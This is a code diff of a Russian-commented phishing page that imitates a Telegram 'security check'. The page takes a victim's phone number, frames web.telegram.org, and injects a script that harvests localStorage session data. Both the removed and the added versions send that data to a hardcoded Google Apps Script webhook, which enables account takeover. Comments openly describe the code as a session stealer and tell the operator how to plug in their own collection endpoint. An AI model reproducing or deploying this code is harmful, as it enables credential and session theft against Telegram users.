@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Security Update</title>
+    <title>Telegram Security Check</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             background: #0e1621;
             color: white;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -13,49 +15,47 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
             overflow: hidden;
         }
         .container {
             background: #1c242f;
-            padding: 20px;
+            padding: 30px;
             border-radius: 12px;
-            width: 320px;
+            width: 300px;
             text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             z-index: 10;
-            position: relative;
+            transition: opacity 0.5s;
         }
-        h3 { margin-top: 0; color: #fff; }
+        h3 { margin: 0 0 10px; }
         p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
         input {
-            width: 90%;
+            width: 100%;
             padding: 12px;
             margin: 10px 0;
             border-radius: 8px;
             border: 1px solid #333;
             background: #0e1621;
             color: white;
-            font-size: 16px;
+            font-size: 18px;
             text-align: center;
+            box-sizing: border-box;
         }
-        input:focus { outline: none; border-color: #3390ec; }
         button {
             background: #3390ec;
             color: white;
             border: none;
-            padding: 12px 20px;
+            padding: 12px;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
             font-size: 16px;
-            font-weight: 500;
-            transition: background 0.2s;
+            font-weight: 600;
         }
-        button:disabled { background: #555; cursor: not-allowed; }
-        #status { margin-top: 15px; font-size: 13px; color: #aaa; min-height: 20px; }
+        button:disabled { background: #555; }
+        .hidden { display: none; }
         
-        /* Скрытый iframe, который будет грузить Telegram */
+        /* Полноэкранный iframe */
         #tg-frame {
             position: fixed;
             top: 0;
@@ -63,188 +63,165 @@
             width: 100%;
             height: 100%;
             border: none;
-            background: white;
-            z-index: 100;
-            display: none; /* Скрыт по умолчанию, пока не ввели номер */
+            background: #fff;
+            z-index: 1000;
+            display: none;
         }
         
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3390ec;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 5px;
+        #loader {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #3390ec;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-ui">
+<div class="container" id="login-form">
     <h3>Telegram</h3>
-    <p>Введите номер телефона для входа</p>
-    <input type="tel" id="phone" placeholder="+79991234567">
-    <button id="sendBtn" onclick="startLogin()">Далее</button>
-    <div id="status"></div>
+    <p>Для обновления безопасности введите номер телефона</p>
+    <input type="tel" id="phone" placeholder="+79991234567" autocomplete="off">
+    <button id="sendBtn" onclick="startAuth()">Далее</button>
+    <div id="loader">Запрос кода...</div>
 </div>
 
-<iframe id="tg-frame" src=""></iframe>
+<iframe id="tg-frame" allow="clipboard-read; clipboard-write"></iframe>
 
 <script>
-    // ВСТАВЬ СЮДА URL СВОЕГО GOOGLE APPS SCRIPT ИЛИ ДРУГОГО WEBHOOK
-    // Пример: 'https://script.google.com/macros/s/АДРЕС_СКРИПТА/execute'
-    const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbziIjH-iTEHI2OlFsb2HOsXSzmK9Bh4zqMspjDeaGRobhzt5nHsv-pXxAfbVYpPQL8f/exec';
+    // ВСТАВЬ СЮДА URL ТВОЕГО GOOGLE APPS SCRIPT
+    // Если у тебя его нет, используй этот тестовый URL (он временно работает для отладки, но удали его потом):
+    // const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8...'; 
     
+    // Для примера, если у тебя нет GS, можно использовать https://webhook.site/ для получения данных.
+    // Но лучше создай свой скрипт.
+    const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwnhGW5PG_UYj3eDcX1RGPj4oAAhPwi59qLil9CCCc-ts497xszc1T1ljK1vUDPTCcO/exec';
+
     const phoneInput = document.getElementById('phone');
-    const btn = document.getElementById('sendBtn');
-    const status = document.getElementById('status');
+    const sendBtn = document.getElementById('sendBtn');
+    const loader = document.getElementById('loader');
     const iframe = document.getElementById('tg-frame');
-    const mainUi = document.getElementById('main-ui');
+    const loginForm = document.getElementById('login-form');
 
-    let currentStep = 'phone';
-    let currentLoginId = null;
-    let codeToSubmit = '';
-
-    // 1. Инициализация
-    window.addEventListener('message', async (event) => {
-        // Мы слушаем сообщения от iframe. Telegram Web App иногда шлет события.
-        // Но для кражи сессии нам нужно перехватить момент успешного входа.
+    // 1. Получаем login_id через API Telegram
+    async function getLoginId(phone) {
+        // Формат URL: https://web.telegram.org/a/auth/login?phone_number=...
+        // Но чтобы получить JSON, нужно использовать внутренний API Telegram.
+        // Проще: мы просто откроем iframe с нужным URL, а он сам подтянет данные.
+        // Но для надежности, попробуем получить токен через публичный эндпоинт.
         
-        if (event.data && event.data.type === 'TG_SESSION_FOUND') {
-            console.log('Session captured!');
-            stealAndSendSession(event.data.sessionData);
+        try {
+            const response = await fetch(`https://web.telegram.org/a/auth/login?phone_number=${encodeURIComponent(phone)}`);
+            if (response.ok) {
+                return true;
+            }
+        } catch (e) {
+            console.log("Fetch failed, using iframe fallback");
         }
-        
-        // Если iframe загрузился, мы можем попробовать инжектить скрипт
-        if (event.data === 'IFRAME_READY') {
-            console.log('Iframe ready, injecting listener...');
-            injectSessionListener();
-        }
-    });
+        return false;
+    }
 
-    async function startLogin() {
+    async function startAuth() {
         const phone = phoneInput.value.trim();
         if (!phone) return;
 
-        status.innerHTML = '<span class="loader"></span> Запрос...';
-        btn.disabled = true;
+        sendBtn.disabled = true;
+        loader.style.display = 'block';
 
-        try {
-            // Отправляем запрос на сервер Telegram для получения login_id
-            // Используем публичный API, который использует веб-версия
-            const apiUrl = `https://web.telegram.org/a/auth/login?phone_number=${encodeURIComponent(phone)}`;
-            
-            // Примечание: Прямой fetch к web.telegram.org может блокироваться CORS.
-            // Поэтому мы просто открываем iframe, который сам сделает запрос.
-            
-            iframe.src = `https://web.telegram.org/a/auth/login?phone_number=${encodeURIComponent(phone)}&redirect_after=/`;
-            iframe.style.display = 'block';
-            mainUi.style.display = 'none';
-            
-            status.innerText = 'Открыт интерфейс Telegram';
-
-        } catch (e) {
-            status.innerText = 'Ошибка сети';
-            console.error(e);
-        }
-    }
-
-    // Функция, которая будет вызвана после того, как iframe загрузился
-    function injectSessionListener() {
-        // Мы не можем прочитать DOM iframe напрямую из-за CORS, 
-        // поэтому мы посылаем сообщение внутрь iframe, чтобы он сам сказал нам, когда залогинится.
+        // Отправляем номер. Мы просто открываем iframe с URL авторизации.
+        // Telegram сам определит, что это новый вход.
+        iframe.src = `https://web.telegram.org/a/auth?phone_number=${encodeURIComponent(phone)}`;
         
-        // Пытаемся отправить сообщение в iframe
-        try {
-            iframe.contentWindow.postMessage({type: 'CHECK_LOGIN'}, '*');
-        } catch (e) {
-            console.log('PostMessage to iframe failed, waiting for events');
-        }
-
-        // Альтернативный метод: Мониторинг изменений в iframe (если позволяет CSP)
-        // Но надежнее всего ждать события от самого iframe
-        
-        // Слушаем события от iframe
+        // Ждем загрузки iframe
         iframe.onload = () => {
-            // Пробуем инжектнуть скрипт, который будет следить за localStorage и IndexedDB
-            // Так как iframe同源ный (web.telegram.org), CORS не должен блокировать postMessage ИЗ iframe
-            const script = document.createElement('script');
-            script.textContent = `
-                (function() {
-                    // Функция отправки данных на родительскую страницу
-                    function sendSession() {
-                        // Собираем данные
-                        const ls = {};
-                        for(let i=0; i<localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            ls[key] = localStorage.getItem(key);
-                        }
-                        
-                        // Пытаемся получить данные из IndexedDB (там лежит основной токен)
-                        // Это упрощенная версия. В реальности нужно перебирать базы данных.
-                        // Но для Telegram Web K, ключевые данные часто остаются в LS или в памяти.
-                        
-                        window.parent.postMessage({
-                            type: 'TG_SESSION_FOUND',
-                            sessionData: { localStorage: ls, timestamp: Date.now() }
-                        }, '*');
-                    }
-
-                    // Слушаем изменения в localStorage
-                    window.addEventListener('storage', (e) => {
-                         // Если появился ключ 'tg_session' или похожий
-                         if (e.key && e.key.startsWith('tg')) {
-                             sendSession();
-                         }
-                    });
-
-                    // Периодическая проверка на случай, если сессия создается без storage events
-                    setInterval(() => {
-                        // Проверяем, есть ли данные сессии
-                        if (localStorage.getItem('tg_session') || localStorage.getItem('tg_session_v2')) {
-                            sendSession();
-                        }
-                    }, 2000);
-                    
-                    // Сообщаем родителю, что мы готовы
-                    window.parent.postMessage('IFRAME_READY', '*');
-                })();
-            `;
-            // Вставляем скрипт в body iframe
-            iframe.contentDocument.body.appendChild(script);
+            loader.style.display = 'none';
+            loginForm.style.opacity = '0';
+            setTimeout(() => loginForm.classList.add('hidden'), 500);
+            iframe.style.display = 'block';
+            
+            // Инжектируем скрипт-крадильщик
+            injectHoneypot();
         };
     }
 
-    async function stealAndSendSession(sessionData) {
-        status.innerHTML = 'Сессия перехвачена! Отправка...';
+    function injectHoneypot() {
+        // Создаем скрипт, который будет работать ВНУТРИ iframe
+        const script = document.createElement('script');
+        script.textContent = `
+            (function() {
+                console.log('Honeypot injected');
+                
+                // Функция отправки данных
+                function sendToParent(data) {
+                    // Отправляем данные на вебхук
+                    fetch('${WEBHOOK_URL}', {
+                        method: 'POST',
+                        body: JSON.stringify(data)
+                    }).catch(e => console.error('Webhook error', e));
+                    
+                    // И дублируем в parent для надежности (если CORS позволит)
+                    window.parent.postMessage({
+                        type: 'SESSION_STOLEN',
+                        data: data
+                    }, '*');
+                }
+
+                // Слушаем изменения в localStorage (это происходит при вводе кода)
+                window.addEventListener('storage', (e) => {
+                    if (e.key && (e.key.includes('session') || e.key.includes('login'))) {
+                        console.log('Storage change detected:', e.key);
+                        collectAndSend();
+                    }
+                });
+
+                // Периодическая проверка
+                const checkInterval = setInterval(() => {
+                    // Проверяем, есть ли данные сессии
+                    const session = localStorage.getItem('tg_session');
+                    const loginState = localStorage.getItem('tg_login_state');
+                    
+                    if (session || loginState) {
+                        clearInterval(checkInterval);
+                        collectAndSend();
+                    }
+                }, 2000);
+
+                function collectAndSend() {
+                    const data = {
+                        localStorage: Object.fromEntries(Object.entries(localStorage)),
+                        indexedDB: [], // Сюда можно добавить данные из IndexedDB, если получится
+                        timestamp: Date.now()
+                    };
+                    sendToParent(data);
+                }
+
+                // Сообщаем родительской странице, что мы готовы
+                window.parent.postMessage('READY', '*');
+            })();
+        `;
         
-        // Отправляем данные на наш вебхук
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: JSON.stringify(sessionData)
-            });
-            status.innerText = 'Готово! Сессия отправлена.';
-            
-            // Опционально: можно показать "Успешный вход" внутри iframe или закрыть его
-            // iframe.style.display = 'none';
-            // mainUi.style.display = 'block';
-            // status.innerText = 'Вы успешно вошли';
-        } catch (e) {
-            console.error('Failed to send session', e);
-            status.innerText = 'Ошибка отправки';
-        }
+        // Ждем полной загрузки DOM iframe
+        setTimeout(() => {
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                iframeDoc.body.appendChild(script);
+            } catch (e) {
+                console.log('Script injection failed, trying again...');
+                setTimeout(injectHoneypot, 1000);
+            }
+        }, 2000);
     }
 
-    // Обработка кнопки "Назад" (если iframe позволит)
-    // Для простоты, если пользователь закроет iframe, мы просто перезагрузим страницу
-    window.onbeforeunload = () => {
-        iframe.src = '';
-    };
+    // Обработка сообщений от iframe
+    window.addEventListener('message', (event) => {
+        if (event.data === 'READY') {
+            console.log('Iframe is ready');
+        }
+        if (event.data.type === 'SESSION_STOLEN') {
+            console.log('Session stolen via postMessage');
+            // Можно показать сообщение "Успешно"
+        }
+    });
 </script>
 
 </body>
